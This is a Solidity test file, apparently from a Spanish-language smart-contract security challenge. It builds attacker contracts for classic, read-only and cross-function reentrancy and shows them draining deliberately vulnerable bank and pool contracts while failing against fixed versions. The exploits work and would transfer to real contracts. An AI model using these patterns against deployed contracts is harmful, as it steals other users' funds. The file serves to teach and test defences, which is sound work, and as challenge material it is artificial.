// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseChallenge} from "./base/BaseChallenge.t.sol";
import {BancoVulnerable, PoolVulnerable, BancoTransferibleVulnerable} from "../src/C2-reentrada/Vulnerable.sol";
import {BancoFixed, PoolFixed, BancoTransferibleFixed} from "../src/C2-reentrada/Fixed.sol";

interface IBanco {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice Atacante de la reentrada clásica: reentra en `receive()`.
contract AtacanteBanco {
    IBanco public banco;

    constructor(address _banco) {
        banco = IBanco(_banco);
    }

    function atacar() external payable {
        banco.deposit{value: msg.value}();
        banco.withdraw();
    }

    receive() external payable {
        if (address(banco).balance >= msg.value) {
            banco.withdraw();
        }
    }
}

interface IPool {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function pricePerShare() external view returns (uint256);
    function shares(address) external view returns (uint256);
}

/// @notice Sonda de la reentrada de solo lectura: durante la retirada, lee el
/// oráculo `pricePerShare` y guarda el valor observado en mitad de la operación.
contract ReadOnlyProbe {
    IPool public pool;
    uint256 public precioObservado;

    constructor(address _pool) {
        pool = IPool(_pool);
    }

    function entrar() external payable {
        pool.deposit{value: msg.value}();
    }

    function salir() external {
        pool.withdraw(pool.shares(address(this)));
    }

    receive() external payable {
        // Reentra solo a la función view: el guard no la protege.
        precioObservado = pool.pricePerShare();
    }
}

interface IBancoTransferible {
    function deposit() external payable;
    function withdraw() external;
    function transfer(address to, uint256 amount) external;
    function balances(address) external view returns (uint256);
}

/// @notice Atacante de la reentrada entre funciones. Dos contratos cómplices se
/// pasan el saldo: mientras uno cobra, en su receive() transfiere el saldo aún no
/// descontado al otro, que en la ronda siguiente vuelve a cobrarlo.
contract AtacanteCruzado {
    IBancoTransferible public banco;
    AtacanteCruzado public complice;

    constructor(address _banco) {
        banco = IBancoTransferible(_banco);
    }

    function setComplice(AtacanteCruzado c) external {
        complice = c;
    }

    function depositar() external payable {
        banco.deposit{value: msg.value}();
    }

    function cobrar() external {
        banco.withdraw();
    }

    receive() external payable {
        // Reentrada en otra función: el guard de withdraw no la cubre.
        banco.transfer(address(complice), msg.value);
    }

    function retirarBotin(address payable to) external {
        to.transfer(address(this).balance);
    }
}

contract C2_Reentrada is BaseChallenge {
    // Variante A: reentrada clásica (reto principal)

    function test_Exploit_Vulnerable() public {
        vm.prank(deployer);
        BancoVulnerable banco = new BancoVulnerable();

        // Fondos de otros usuarios: 10 ETH.
        vm.prank(user1);
        banco.deposit{value: 10 ether}();
        assertFalse(banco.isSolved(), "no debe partir resuelto");

        // El atacante drena el banco partiendo de 1 ETH.
        vm.prank(attacker);
        AtacanteBanco exploit = new AtacanteBanco(address(banco));
        vm.prank(attacker);
        exploit.atacar{value: 1 ether}();

        assertTrue(banco.isSolved(), "el banco debe quedar vacio");
        assertEq(address(exploit).balance, 11 ether, "el atacante se lleva 11 ETH");
    }

    function test_Fixed_Resiste() public {
        vm.prank(deployer);
        BancoFixed banco = new BancoFixed();

        vm.prank(user1);
        banco.deposit{value: 10 ether}();

        vm.prank(attacker);
        AtacanteBanco exploit = new AtacanteBanco(address(banco));

        // El guard + CEI cortan la reentrada: la llamada reentrante revierte,
        // el envío falla y la retirada completa revierte con su mensaje.
        vm.prank(attacker);
        vm.expectRevert(bytes("transferencia fallida"));
        exploit.atacar{value: 1 ether}();

        assertFalse(banco.isSolved(), "la version corregida no se resuelve");
        assertEq(address(banco).balance, 10 ether, "los fondos siguen en el banco");
    }

    // Variante B: reentrada de solo lectura

    function test_Exploit_ReadOnly_Vulnerable() public {
        vm.prank(deployer);
        PoolVulnerable pool = new PoolVulnerable();

        vm.prank(user1);
        pool.deposit{value: 10 ether}();

        ReadOnlyProbe probe = new ReadOnlyProbe(address(pool));
        vm.deal(address(probe), 10 ether);
        probe.entrar{value: 10 ether}();

        uint256 precioCorrecto = pool.pricePerShare(); // 1e18 fuera de la operación
        probe.salir();

        // Durante la retirada, el oráculo devolvió un precio inconsistente.
        assertTrue(probe.precioObservado() != precioCorrecto, "el view debe leerse a medias");
        assertEq(probe.precioObservado(), 0.5e18, "precio deflactado por estado inconsistente");
    }

    function test_Fixed_ReadOnly_Resiste() public {
        vm.prank(deployer);
        PoolFixed pool = new PoolFixed();

        vm.prank(user1);
        pool.deposit{value: 10 ether}();

        ReadOnlyProbe probe = new ReadOnlyProbe(address(pool));
        vm.deal(address(probe), 10 ether);
        probe.entrar{value: 10 ether}();

        uint256 precioCorrecto = pool.pricePerShare();
        probe.salir();

        // Con CEI estricto, el view es consistente también durante la operación.
        assertEq(probe.precioObservado(), precioCorrecto, "el view es consistente");
    }
    // Variante C: reentrada entre funciones

    function _montarCruzado(address banco) internal returns (AtacanteCruzado a, AtacanteCruzado b) {
        vm.startPrank(attacker);
        a = new AtacanteCruzado(banco);
        b = new AtacanteCruzado(banco);
        a.setComplice(b);
        b.setComplice(a);
        a.depositar{value: 1 ether}();
        vm.stopPrank();
    }

    function test_Exploit_CrossFunction_Vulnerable() public {
        vm.prank(deployer);
        BancoTransferibleVulnerable banco = new BancoTransferibleVulnerable();
        vm.prank(user1);
        banco.deposit{value: 10 ether}();

        (AtacanteCruzado a, AtacanteCruzado b) = _montarCruzado(address(banco));

        // Cada ronda cobra 1 ETH y deja ese mismo ETH acreditado al cómplice.
        // Con 1 ETH inicial, 11 rondas vacían el banco (10 ETH ajenos + 1 propio).
        for (uint256 i = 0; i < 11; i++) {
            (i % 2 == 0 ? a : b).cobrar();
        }

        assertTrue(banco.isSolved(), "el banco debe quedar vacio");
        assertEq(address(a).balance + address(b).balance, 11 ether, "los complices suman 11 ETH");
        // El guard de withdraw estaba activo todo el tiempo y no lo impidió.
    }

    function test_Fixed_CrossFunction_Resiste() public {
        vm.prank(deployer);
        BancoTransferibleFixed banco = new BancoTransferibleFixed();
        vm.prank(user1);
        banco.deposit{value: 10 ether}();

        (AtacanteCruzado a, ) = _montarCruzado(address(banco));

        // La reentrada en transfer revierte (guard compartido y saldo ya a cero),
        // y con ella toda la retirada.
        vm.expectRevert(bytes("transferencia fallida"));
        a.cobrar();

        assertEq(address(banco).balance, 11 ether, "los fondos siguen en el banco");
        assertEq(banco.balances(address(a)), 1 ether, "el atacante solo conserva su deposito");
        assertFalse(banco.isSolved(), "la version corregida no se resuelve");
    }
}
